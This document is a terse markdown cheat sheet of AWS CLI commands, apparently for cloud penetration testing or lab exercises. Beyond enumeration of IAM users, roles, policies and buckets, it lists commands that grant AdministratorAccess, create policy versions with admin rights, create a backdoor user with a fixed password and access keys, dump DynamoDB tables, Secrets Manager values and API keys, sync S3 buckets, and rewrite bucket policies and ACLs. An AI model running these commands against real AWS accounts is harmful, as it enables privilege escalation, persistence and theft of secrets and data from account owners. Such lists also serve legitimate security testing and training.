## caller id
```
aws sts get-caller-identity
```
## assume role
```
aws sts assume-role --role-arn arn:aws:iam::666666666666:role/ad-example --role-session-name ad-example
```
## list, show stuff
```
aws ec2 describe-instances
aws s3 ls
aws s3api list-buckets
aws iam list-users
aws iam list-roles
aws iam list-groups-for-user --user-name user-example
aws iam list-group-policies --group-name Admins
```

## list (attached) policys
```
aws iam list-attached-role-policies --role-name ad-example
aws iam list-attached-user-policies --user-name user-example
aws iam list-user-policies --user-name user-example
```

## get policy
```
aws iam get-policy --policy-arn ...
aws iam get-user-policy --user-name user-example --policy-name ...
aws iam get-policy-version --policy-arn ... --version-id v1
aws iam get-role-policy --role-name ... --policy-name ...
```

## attach a policy
```
aws iam attach-user-policy --user-name user-example --policy-arn ...
aws iam attach-user-policy --user-name user-example --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam attach-group-policy --group-name developer --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## add admin policy
```
aws iam create-policy-version --policy-arn arn:aws:iam::666666666666:policy/Print --policy-document file:///.../newAdminPolicy.json --set-as-default
aws iam put-group-policy --group-name Admins --policy-document file:///.../newAdminPolicy.json --policy-name AdminRoot
aws iam put-role-policy --role-name developerlambda --policy-name adminnow --policy-document file:///.../newAdminPolicy.json      
```

## role policy
```
aws iam list-role-policies --role-name admin
aws iam get-role-policy --role-name admin --policy-name AddUser
```

## search for adminstuff
```
aws iam list-policies | grep 'AdministratorAccess'  
```

## add user to group, create user, change login
```
aws iam add-user-to-group --group-name developer --user-name kevin
aws iam create-login-profile --user-name mandy --password compliance123! --no-password-reset-required
aws iam create-user --user-name backdoorbeaver
aws iam create-access-key --user-name Bob
```

## EC2, list, deploy
```
aws ec2 describe-subnets
aws ec2 describe-security-groups
aws iam list-instance-profiles

aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output json | jq -r '.Images | sort_by(.CreationDate) | last(.[]).ImageId'

aws ec2 run-instances --subnet-id subnet-.... --image-id ami-... --iam-instance-profile Name=ec2_admin --instance-type t2.micro --security-group-ids "sg-..."
```

## dynamadb
```
aws dynamodb scan --table-name secrettable-233223 --region us-east-1
```

## secret
```
aws secretsmanager get-secret-value --secret-id ...--region
```

## s3
```
aws s3 ls
aws s3api list-buckets
aws s3 sync s3://user-resources-12jljlaj3434ljalsjf/ ./
aws s3api list-objects --bucket ...
aws s3 --no-sign-request --region ap-southeast-1 ls s3://static-resources-example
aws s3api get-bucket-policy --bucket ... --output text | python -m json.tool
aws s3api put-bucket-policy --bucket ... --policy file://policy.json
aws s3api get-bucket-acl --bucket ... > acl.json
aws s3api put-bucket-acl --bucket --access-control-policy file://acl.json
aws s3api get-object-acl --bucket ... --key secret_object > object.json
aws s3api put-object-acl --bucket ... --key secret_object --access-control-policy file://object.json
```

## API
```
aws apigateway get-account
aws apigateway get-rest-apis
aws apigateway get-api-keys
aws apigateway get-api-key --api-key ... --include-value
aws apigateway get-ressources --rest-api-id ...
aws apigateway get-method --rest-api-id ... --http-method GET --ressource-id ...
```

## lambda
```
aws lambda get-function --function-name DynamoFunction  
aws lambda list-functions
aws lambda invoke --function-name evil-function output.txt
```
